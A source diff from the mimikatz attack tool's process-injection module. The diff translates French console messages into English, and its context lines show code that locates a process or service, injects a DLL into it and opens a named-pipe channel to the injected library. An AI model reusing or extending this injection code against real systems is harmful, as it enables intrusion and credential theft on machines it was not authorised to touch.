@@ -10,9 +10,9 @@ mod_pipe * mod_mimikatz_inject::monCommunicator = NULL;
 vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_inject::getMimiKatzCommands()
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pid, L"pid", L"Injecte une librairire communicante dans un PID"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(process, L"process", L"Injecte une librairire communicante dans un processus"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(service, L"service", L"Injecte une librairire communicante dans un service"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pid, L"pid", L"Injects a library into a PID"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(process, L"process", L"Injects a library into a process"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(service, L"service", L"Injects a library into a service"));
 	return monVector;
 }
 
@@ -27,7 +27,7 @@ bool mod_mimikatz_inject::process(vector<wstring> * arguments)
 		wcout << L"PROCESSENTRY32(" << processName << L").th32ProcessID = " << monProcess.th32ProcessID << endl;
 		injectInPid(monProcess.th32ProcessID, fullLib);
 	}
-	else wcout << L"Trop, ou pas de processus : \'" << processName << L"\' mod_process::getUniqueProcessForName : " << mod_system::getWinError() << endl;
+	else wcout << L"Too much or not process : \'" << processName << L"\' mod_process::getUniqueProcessForName : " << mod_system::getWinError() << endl;
 
 	return true;
 }
@@ -44,7 +44,7 @@ bool mod_mimikatz_inject::service(vector<wstring> * arguments)
 		wcout << L"SERVICE(" << serviceName << L").ServiceStatusProcess.dwProcessId = " << monService.ServiceStatusProcess.dwProcessId << endl;
 		injectInPid(monService.ServiceStatusProcess.dwProcessId, fullLib);
 	}
-	else wcout << L"Service unique introuvable : \'" << serviceName << L"\' ; mod_service::getUniqueForName : " << mod_system::getWinError() << endl;
+	else wcout << L"Unique service not found : \'" << serviceName << L"\' ; mod_service::getUniqueForName : " << mod_system::getWinError() << endl;
 
 	return true;
 }
@@ -76,32 +76,32 @@ bool mod_mimikatz_inject::injectInPid(DWORD & pid, wstring & libPath, bool isCom
 				wstring monBuffer = L"";
 
 				monCommunicator = new mod_pipe(L"kiwi\\mimikatz");
-				wcout << L"Attente de connexion du client..." << endl;
+				wcout << L"Waiting for client connection..." << endl;
 
 				if(monCommunicator->createServer())
 				{
-					wcout << L"Serveur connecté à un client !" << endl;
+					wcout << L"Server connected to a client !" << endl;
 					if(monCommunicator->readFromPipe(monBuffer))
 					{
-						wcout << L"Message du processus :" << endl << monBuffer << endl;
+						wcout << L"Message process :" << endl << monBuffer << endl;
 					}
 					else
 					{
-						wcout << L"Erreur : Impossible de lire le premier message ! ; " <<  mod_system::getWinError() << endl;
+						wcout << L"Error : Unable to read the first message ! ; " <<  mod_system::getWinError() << endl;
 						closeThisCommunicator();
 					}
 				}
 				else
 				{
-					wcout << L"Erreur : Impossible de créer un canal de communication ! ; " << mod_system::getWinError() << endl;
+					wcout << L"Error : Unable to create a communication channel! ; " << mod_system::getWinError() << endl;
 					closeThisCommunicator();
 				}
 			}
 			else
-				wcout << L"Injecté sans communication (legacy)" << endl;
-		} else wcout << L"Erreur : Impossible d\'injecter ! ; " << mod_system::getWinError() << endl;
+				wcout << L"Injected without communication (legacy)" << endl;
+		} else wcout << L"Error : Unable to inject ! ; " << mod_system::getWinError() << endl;
 	}
-	else wcout << L"Erreur : un canal de communicaton est déjà ouvert" << endl;
+	else wcout << L"Error : communicaton channel is already open" << endl;
 
 	return reussite;
 }
@@ -111,7 +111,7 @@ bool mod_mimikatz_inject::closeThisCommunicator()
 {
 	if(monCommunicator)
 	{
-		wcout << L"Fermeture du canal de communication" << endl;
+		wcout << L"Closure of the communication channel" << endl;
 		delete monCommunicator;
 		monCommunicator = NULL;
 	}
